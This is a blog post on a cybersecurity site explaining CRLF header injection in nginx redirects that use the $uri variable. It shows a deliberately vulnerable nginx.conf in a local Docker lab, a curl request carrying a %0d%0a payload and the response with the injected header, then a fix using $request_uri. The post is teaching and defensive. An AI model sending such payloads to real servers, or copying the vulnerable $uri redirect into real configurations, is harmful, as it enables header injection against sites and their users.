<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> The story of Nginx $uri variable and CRLF injection · ReverseBrain | Cybersecurity Blog</title><meta name="description" content="The story of Nginx $uri variable and CRLF injection - ReverseBrain"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="https://reversebrain.github.io/atom.xml" title="ReverseBrain | Cybersecurity Blog"><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="ReverseBrain | Cybersecurity Blog" type="application/atom+xml">
</head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="https://github.com/reversebrain" target="_blank" class="nav-list-link">GITHUB</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">The story of Nginx $uri variable and CRLF injection</h1><div class="post-info">Mar 29, 2021</div><div class="post-content"><h1 id="Nginx-uri-and-document-uri-variables"><a href="#Nginx-uri-and-document-uri-variables" class="headerlink" title="Nginx $uri and $document_uri variables"></a>Nginx $uri and $document_uri variables</h1><p>According to nginx documentation, $uri and $document_uri contain the normalized URI whereas the normalization includes URL decoding the URI.<br>Working with nginx reverse proxy directives, you maybe find this configuration very familiar:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location &#x2F;static&#x2F; &#123;</span><br><span class="line">  return 302 https:&#x2F;&#x2F;example.com$uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>Every file requested under <em>/static/</em> folder will be redirect to another server, in this case <em>example.com</em>.</p>
<h1 id="Carriage-Return-Line-Feed-CRLF-Injection"><a href="#Carriage-Return-Line-Feed-CRLF-Injection" class="headerlink" title="Carriage Return Line Feed (CRLF) Injection"></a>Carriage Return Line Feed (CRLF) Injection</h1><p>A Carriage Return Line Feed (CRLF) Injection vulnerability is a type of Server Side Injection which occurs when an attacker inserts the CRLF characters in an input field to deceive the server by making it think that an object has terminated and a new one has begun.</p>
<p>Let’s create a docker container with nginx listening on port 8081 and a netcat listening locally on port 80. This is the <em>nginx.conf</em> file:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">user  nginx;</span><br><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line">error_log  &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log warn;</span><br><span class="line">pid        &#x2F;var&#x2F;run&#x2F;nginx.pid;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       &#x2F;etc&#x2F;nginx&#x2F;mime.types;</span><br><span class="line">    default_type  application&#x2F;octet-stream;</span><br><span class="line"></span><br><span class="line">    log_format  main  &#39;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#39;</span><br><span class="line">                      &#39;$status $body_bytes_sent &quot;$http_referer&quot; &#39;</span><br><span class="line">                      &#39;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#39;;</span><br><span class="line"></span><br><span class="line">    access_log  &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log  main;</span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line">    #tcp_nopush     on;</span><br><span class="line"></span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    #gzip  on;</span><br><span class="line"></span><br><span class="line">    # include &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;*.conf;</span><br><span class="line">    </span><br><span class="line">    server &#123;</span><br><span class="line">        location &#x2F;static&#x2F; &#123;</span><br><span class="line">            return 302 http:&#x2F;&#x2F;172.17.0.1$uri;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Notice that location directive redirects all <em>/static/</em> routes to our netcat. If we request <em>/static/test.js</em> we receive the following HTTP request:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;static&#x2F;test.js HTTP&#x2F;1.1</span><br><span class="line">Host: 172.17.0.1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:78.0) Gecko&#x2F;20100101 Firefox&#x2F;78.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
<p>Everything seems ok, but where is the problem? Let’s try to inject a CRLF like <em>/static/%0d%0aX-Foo:%20CLRF</em>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;static&#x2F;%0d%0aX-Foo:%20CLRF&quot; -v</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">*   Trying 127.0.0.1:8081...</span><br><span class="line">* Connected to 127.0.0.1 (127.0.0.1) port 8081 (#0)</span><br><span class="line">&gt; GET &#x2F;static&#x2F;%0d%0aX-Foo:%20CLRF HTTP&#x2F;1.1</span><br><span class="line">&gt; Host: 127.0.0.1:8081</span><br><span class="line">&gt; User-Agent: curl&#x2F;7.74.0</span><br><span class="line">&gt; Accept: *&#x2F;*</span><br><span class="line">&gt; </span><br><span class="line">* Mark bundle as not supporting multiuse</span><br><span class="line">&lt; HTTP&#x2F;1.1 302 Moved Temporarily</span><br><span class="line">&lt; Server: nginx&#x2F;1.19.8</span><br><span class="line">&lt; Date: Mon, 29 Mar 2021 09:05:45 GMT</span><br><span class="line">&lt; Content-Type: text&#x2F;html</span><br><span class="line">&lt; Content-Length: 145</span><br><span class="line">&lt; Connection: keep-alive</span><br><span class="line">&lt; Location: http:&#x2F;&#x2F;172.17.0.1&#x2F;static&#x2F;</span><br><span class="line">&lt; X-Foo: CLRF</span><br><span class="line">&lt; </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;302 Found&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;302 Found&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;hr&gt;&lt;center&gt;nginx&#x2F;1.19.8&lt;&#x2F;center&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">* Connection #0 to host 127.0.0.1 left intact</span><br></pre></td></tr></table></figure>
<p>Take a look at server response, we find our injected header!<br>Exploitation now is limited only by imagination, read more about the vulnerability risks here: <a target="_blank" rel="noopener" href="https://www.netsparker.com/blog/web-security/crlf-http-header/">https://www.netsparker.com/blog/web-security/crlf-http-header/</a></p>
<h1 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h1><p>Is there a way to avoid the CRLF injection in the nginx configuration? The answer is yes: just use $request_uri insted of $uri or $document_uri.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        location &#x2F;static&#x2F; &#123;</span><br><span class="line">            return 302 http:&#x2F;&#x2F;172.17.0.1$request_uri;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>If we repeat again the exploitation seen before now we get another different result:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">*   Trying 127.0.0.1:8081...</span><br><span class="line">* Connected to 127.0.0.1 (127.0.0.1) port 8081 (#0)</span><br><span class="line">&gt; GET &#x2F;static&#x2F;%0d%0aX-Foo:%20CLRF HTTP&#x2F;1.1</span><br><span class="line">&gt; Host: 127.0.0.1:8081</span><br><span class="line">&gt; User-Agent: curl&#x2F;7.74.0</span><br><span class="line">&gt; Accept: *&#x2F;*</span><br><span class="line">&gt; </span><br><span class="line">* Mark bundle as not supporting multiuse</span><br><span class="line">&lt; HTTP&#x2F;1.1 302 Moved Temporarily</span><br><span class="line">&lt; Server: nginx&#x2F;1.19.8</span><br><span class="line">&lt; Date: Mon, 29 Mar 2021 09:17:45 GMT</span><br><span class="line">&lt; Content-Type: text&#x2F;html</span><br><span class="line">&lt; Content-Length: 145</span><br><span class="line">&lt; Connection: keep-alive</span><br><span class="line">&lt; Location: http:&#x2F;&#x2F;172.17.0.1&#x2F;static&#x2F;%0d%0aX-Foo:%20CLRF</span><br><span class="line">&lt; </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;302 Found&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;302 Found&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;hr&gt;&lt;center&gt;nginx&#x2F;1.19.8&lt;&#x2F;center&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">* Connection #0 to host 127.0.0.1 left intact</span><br></pre></td></tr></table></figure>
<p>Now the carriage returns and new lines are not parsed and we can’t inject other headers.</p>
</div></article></div></main><footer><div class="paginator"><a href="/2020/12/01/Is-Apache-vulnerable-by-default-to-XSS/" class="next">NEXT</a></div><div class="copyright"><p>© 2020 - 2021 <a href="https://reversebrain.github.io">ReverseBrain</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>